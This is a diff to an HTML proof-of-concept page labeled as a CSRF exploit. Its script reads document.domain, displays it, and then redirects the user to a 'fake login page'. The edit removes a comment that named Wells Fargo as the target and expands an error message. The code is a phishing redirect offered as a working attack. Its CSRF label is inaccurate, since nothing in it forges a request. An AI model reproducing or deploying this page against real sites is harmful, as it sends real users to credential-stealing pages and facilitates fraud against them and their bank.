@@ -2813,7 +2813,7 @@
   <title>CSRF PoC for Document Domain</title>
   <body>
     <script>
-      // Check if we can access the document.domain from Wells Fargo
+      // Try to access the document.domain
       try {
         var docDomain = document.domain;
         alert('Document Domain: ' + docDomain);  // Display the document domain
@@ -2824,7 +2824,8 @@
         // Redirect the user to the fake login page after capturing document.domain
         window.location.href = fakeLoginUrl;
       } catch (e) {
-        alert('Unable to access document.domain due to cross-origin restrictions.');
+        // If there is an error accessing document.domain due to cross-origin restrictions, show an alert
+        alert('Unable to access document.domain due to cross-origin restrictions. Error: ' + e.message);
       }
     </script>
 
